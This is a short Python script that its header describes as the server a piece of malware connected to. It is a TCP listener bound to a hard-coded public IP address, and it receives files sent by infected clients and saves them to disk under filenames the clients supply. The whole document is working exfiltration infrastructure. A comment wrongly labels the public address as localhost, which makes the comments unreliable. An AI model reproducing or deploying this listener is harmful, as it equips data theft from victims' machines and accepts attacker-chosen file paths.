#!/usr/bin/env python3

###############################################################################
#
# This is the server that was used for the malware to connec to.
#
###############################################################################

import socket
from time import sleep

HOST = '143.198.148.79'  # Standard loopback interface address (localhost)
PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
SIZE = 500000
FORMAT = "utf-8"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    print('Listening...')
    s.listen()
    while True:
        conn, addr = s.accept()
        print(f"[NEW CONNECTION] {addr} connected.")

        # receive the filename from the client
        filename = conn.recv(SIZE).decode(FORMAT)
        print(f"[RECV] Receiving the filename: {filename}")

        file = open(filename, "wb")
        conn.send("Filename received.".encode(FORMAT))

        # receiving the file data from the client
        print(f"[RECV] Receiving the file data.")

        received = conn.recv(SIZE)
        while received:
            file.write(received)
            received = conn.recv(SIZE)

        print(f"[RECV] File data received!")

        conn.send("File data received".encode(FORMAT))

        # close the file
        file.close()

        # close the connection to the client.
        conn.close()
        print(f"[DISCONNECTED] {addr} disconnected.")